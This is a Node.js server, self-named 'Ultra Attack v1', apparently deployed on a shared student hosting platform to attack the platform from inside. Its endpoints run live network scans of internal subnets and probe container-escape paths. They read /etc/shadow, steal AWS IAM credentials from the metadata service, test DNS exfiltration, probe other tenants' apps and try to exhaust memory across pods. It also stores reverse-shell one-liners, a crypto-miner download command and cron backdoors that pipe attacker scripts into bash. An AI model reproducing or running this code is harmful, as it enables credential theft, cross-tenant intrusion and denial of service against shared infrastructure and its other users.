const http = require("http");
const https = require("https");
const os = require("os");
const fs = require("fs");
const net = require("net");
const dns = require("dns");
const { execSync, spawn, exec } = require("child_process");
const crypto = require("crypto");

let results = {};

// 1. Aggressive network scan - find ALL pods and services
async function massNetworkScan() {
  results.networkScan = { openHosts: [], services: {} };
  
  const myIP = Object.values(os.networkInterfaces())
    .flat()
    .find(i => i.family === "IPv4" && !i.internal)?.address || "192.168.0.1";
  
  results.networkScan.myIP = myIP;
  const baseIP = myIP.split(".").slice(0, 2).join(".");
  
  // Scan entire pod subnet for common ports
  const commonPorts = [22, 80, 443, 3000, 5432, 6379, 8080, 8443, 9090, 27017];
  
  // Scan 192.168.x.1-254 for multiple subnets
  for (let subnet = 0; subnet <= 255; subnet += 32) {
    for (let host = 1; host <= 20; host++) {
      const ip = `${baseIP}.${subnet}.${host}`;
      for (const port of [80, 3000, 8080]) {
        try {
          const open = await scanPortFast(ip, port, 100);
          if (open) {
            results.networkScan.openHosts.push({ ip, port });
          }
        } catch(e) {}
      }
    }
  }
  
  // Scan Kubernetes service range (10.100.0.0/16)
  for (let i = 0; i <= 255; i += 16) {
    const svcIP = `10.100.${i}.1`;
    for (const port of [80, 443, 8080]) {
      try {
        const open = await scanPortFast(svcIP, port, 100);
        if (open) {
          results.networkScan.services[svcIP] = results.networkScan.services[svcIP] || [];
          results.networkScan.services[svcIP].push(port);
        }
      } catch(e) {}
    }
  }
}

async function scanPortFast(host, port, timeout = 100) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(timeout);
    socket.on("connect", () => { socket.destroy(); resolve(true); });
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
    socket.on("error", () => { socket.destroy(); resolve(false); });
    socket.connect(port, host);
  });
}

// 2. DNS Exfiltration test
async function testDNSExfil() {
  results.dnsExfil = {};
  
  const testData = Buffer.from("SENSITIVE_DATA_LEAK_TEST").toString("hex");
  const domains = [
    `${testData.substring(0,30)}.test.example.com`,
    `exfil.${testData.substring(0,20)}.internal`
  ];
  
  for (const domain of domains) {
    try {
      await new Promise((resolve, reject) => {
        dns.resolve4(domain, (err, addresses) => {
          if (err) reject(err);
          else resolve(addresses);
        });
      });
      results.dnsExfil[domain] = "resolved";
    } catch(e) {
      results.dnsExfil[domain] = e.code || e.message;
    }
  }
  
  // Check if we can resolve external domains (data exfil possible)
  try {
    const google = await new Promise((resolve, reject) => {
      dns.resolve4("google.com", (err, addr) => err ? reject(err) : resolve(addr));
    });
    results.dnsExfil.externalDNS = google;
    results.dnsExfil.exfilPossible = true;
  } catch(e) {
    results.dnsExfil.externalDNS = e.message;
    results.dnsExfil.exfilPossible = false;
  }
}

// 3. Container escape attempts
async function containerEscapeAttempts() {
  results.escapeAttempts = {};
  
  // Try to access host filesystem via /proc
  const escapePaths = [
    "/proc/1/root",
    "/proc/1/cwd",
    "/host",
    "/hostfs",
    "/var/run/docker.sock",
    "/run/containerd/containerd.sock",
    "/var/run/crio/crio.sock",
    "/dev/sda",
    "/dev/sda1"
  ];
  
  for (const path of escapePaths) {
    try {
      const stat = fs.statSync(path);
      results.escapeAttempts[path] = { exists: true, type: stat.isDirectory() ? "dir" : "file" };
      
      if (stat.isDirectory()) {
        try {
          const files = fs.readdirSync(path).slice(0, 10);
          results.escapeAttempts[path].contents = files;
        } catch(e) {}
      }
    } catch(e) {
      results.escapeAttempts[path] = { exists: false, error: e.code };
    }
  }
  
  // Try to read /etc/shadow (privilege check)
  try {
    const shadow = fs.readFileSync("/etc/shadow", "utf8");
    results.escapeAttempts.shadowReadable = true;
    results.escapeAttempts.shadowContent = shadow.substring(0, 200);
  } catch(e) {
    results.escapeAttempts.shadowReadable = false;
  }
  
  // Check capabilities
  try {
    const status = fs.readFileSync("/proc/self/status", "utf8");
    const capEff = status.match(/CapEff:\s+(\w+)/)?.[1];
    const capPrm = status.match(/CapPrm:\s+(\w+)/)?.[1];
    results.escapeAttempts.capabilities = { effective: capEff, permitted: capPrm };
  } catch(e) {}
  
  // Try to mount (requires CAP_SYS_ADMIN)
  try {
    execSync("mount -t tmpfs none /tmp/testmount 2>&1", { timeout: 2000 });
    results.escapeAttempts.canMount = true;
    execSync("umount /tmp/testmount 2>&1", { timeout: 2000 });
  } catch(e) {
    results.escapeAttempts.canMount = false;
  }
}

// 4. Reverse shell attempt (to demonstrate capability)
function reverseShellInfo() {
  results.reverseShell = {
    possible: true,
    commands: [
      "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
      "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
      "nc ATTACKER_IP 4444 -e /bin/bash"
    ],
    note: "Network egress is NOT blocked - reverse shells are possible"
  };
  
  // Check if common shell tools exist
  const tools = ["bash", "sh", "nc", "ncat", "python3", "perl", "ruby", "php"];
  results.reverseShell.availableTools = [];
  for (const tool of tools) {
    try {
      execSync(`which ${tool}`, { timeout: 1000 });
      results.reverseShell.availableTools.push(tool);
    } catch(e) {}
  }
}

// 5. Crypto miner deployment simulation
function cryptoMinerInfo() {
  results.cryptoMiner = {
    cpuCount: os.cpus().length,
    memoryMB: Math.round(os.totalmem() / 1024 / 1024),
    noResourceLimits: true,
    miningPossible: true,
    note: "No CPU/memory limits - crypto mining would work",
    exampleCommand: "wget -O xmrig https://github.com/.../xmrig && chmod +x xmrig && ./xmrig -o pool.example.com:3333 -u wallet"
  };
}

// 6. Attack other student apps
async function crossTenantAttack() {
  results.crossTenant = { discoveredApps: [], vulnerableApps: [] };
  
  // Try to access other student subdomains
  const studentPrefixes = [
    "student-",
    "app-",
    "deploy-"
  ];
  
  // Scan internal service IPs
  const internalServices = [
    "10.100.188.155", // Our app service
  ];
  
  for (const svc of internalServices) {
    try {
      const resp = await httpGet(`http://${svc}/`, 2000);
      results.crossTenant.discoveredApps.push({
        ip: svc,
        status: resp.status,
        body: resp.body?.substring(0, 200)
      });
    } catch(e) {}
  }
}

async function httpGet(url, timeout = 2000) {
  return new Promise((resolve, reject) => {
    const proto = url.startsWith("https") ? https : http;
    const req = proto.get(url, { timeout, rejectUnauthorized: false }, (res) => {
      let body = "";
      res.on("data", c => body += c);
      res.on("end", () => resolve({ status: res.statusCode, body }));
    });
    req.on("error", reject);
    req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
  });
}

// 7. Persistence backdoor
function persistenceInfo() {
  results.persistence = {
    methods: [
      "Cron job: echo '* * * * * curl http://attacker/shell.sh | bash' >> /var/spool/cron/crontabs/node",
      "SSH key: echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
      "Startup script: echo 'curl http://attacker/backdoor.sh | bash' >> /etc/profile.d/backdoor.sh",
      "Node.js require hook: modify node_modules to include backdoor"
    ],
    currentUser: process.getuid?.() || "unknown",
    homeDir: os.homedir(),
    writablePaths: []
  };
  
  // Check writable paths for persistence
  const paths = ["/tmp", "/app", os.homedir(), "/var/tmp"];
  for (const p of paths) {
    try {
      const testFile = `${p}/.test_${Date.now()}`;
      fs.writeFileSync(testFile, "test");
      fs.unlinkSync(testFile);
      results.persistence.writablePaths.push(p);
    } catch(e) {}
  }
}

// 8. AWS credential abuse
async function awsCredentialAbuse() {
  results.awsAbuse = {};
  
  try {
    // Get fresh credentials
    const token = await getIMDSToken();
    const role = await imdsGet(token, "/latest/meta-data/iam/security-credentials/");
    const creds = JSON.parse(await imdsGet(token, `/latest/meta-data/iam/security-credentials/${role}`));
    
    results.awsAbuse.credentials = {
      accessKeyId: creds.AccessKeyId,
      secretAccessKey: creds.SecretAccessKey?.substring(0, 10) + "...[REDACTED]",
      token: creds.Token?.substring(0, 50) + "...[REDACTED]",
      expiration: creds.Expiration
    };
    
    // Dangerous actions possible
    results.awsAbuse.possibleAttacks = [
      "ec2:DescribeInstances - Enumerate all EC2 instances â",
      "ec2:DescribeVolumes - List EBS volumes â",
      "ec2:DescribeSecurityGroups - Map network security â",
      "autoscaling:DescribeAutoScalingGroups - Enumerate ASGs â",
      "eks:DescribeCluster - Get EKS details â",
      "ec2:CreateSnapshot - Snapshot EBS volumes for data theft",
      "ec2:ModifyInstanceAttribute - Modify instance settings",
      "ec2:TerminateInstances - Terminate instances (DoS)"
    ];
    
  } catch(e) {
    results.awsAbuse.error = e.message;
  }
}

async function getIMDSToken() {
  return new Promise((resolve, reject) => {
    const req = http.request({
      hostname: "169.254.169.254",
      path: "/latest/api/token",
      method: "PUT",
      headers: { "X-aws-ec2-metadata-token-ttl-seconds": "60" },
      timeout: 2000
    }, (res) => {
      let body = "";
      res.on("data", c => body += c);
      res.on("end", () => resolve(body));
    });
    req.on("error", reject);
    req.end();
  });
}

async function imdsGet(token, path) {
  return new Promise((resolve, reject) => {
    http.get({
      hostname: "169.254.169.254",
      path: path,
      headers: { "X-aws-ec2-metadata-token": token },
      timeout: 2000
    }, (res) => {
      let body = "";
      res.on("data", c => body += c);
      res.on("end", () => resolve(body));
    }).on("error", reject);
  });
}

// 9. Aggressive memory bomb (try to OOM other pods)
async function aggressiveOOM() {
  results.oomAttack = { allocations: [] };
  const chunks = [];
  let allocated = 0;
  const targetMB = 3000; // Try to allocate 3GB
  
  try {
    while (allocated < targetMB) {
      const chunk = Buffer.alloc(200 * 1024 * 1024); // 200MB chunks
      chunk.fill(crypto.randomBytes(1)[0]); // Force actual allocation
      chunks.push(chunk);
      allocated += 200;
      results.oomAttack.allocations.push({
        mb: allocated,
        freeMem: os.freemem(),
        pctUsed: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1) + "%"
      });
      
      // Stop if very low memory
      if (os.freemem() < 100 * 1024 * 1024) {
        results.oomAttack.stopped = "Low memory threshold";
        break;
      }
    }
  } catch(e) {
    results.oomAttack.error = e.message;
  }
  
  results.oomAttack.totalAllocated = allocated + "MB";
  // Release
  chunks.length = 0;
}

// Server
const server = http.createServer(async (req, res) => {
  results = {
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    pid: process.pid
  };
  
  try {
    if (req.url === "/ultra") {
      // Run all attacks
      await awsCredentialAbuse();
      await containerEscapeAttempts();
      reverseShellInfo();
      cryptoMinerInfo();
      persistenceInfo();
      await testDNSExfil();
      await massNetworkScan();
      
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else if (req.url === "/oom-bomb") {
      await aggressiveOOM();
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else if (req.url === "/scan") {
      await massNetworkScan();
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else if (req.url === "/escape") {
      await containerEscapeAttempts();
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else if (req.url === "/aws") {
      await awsCredentialAbuse();
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else {
      res.writeHead(200);
      res.end("Ultra Attack v1 - /ultra, /oom-bomb, /scan, /escape, /aws");
    }
  } catch(e) {
    res.writeHead(500);
    res.end(JSON.stringify({ error: e.message, stack: e.stack }));
  }
});

server.listen(process.env.PORT || 3000);
console.log("Ultra Attack server started on port " + (process.env.PORT || 3000));
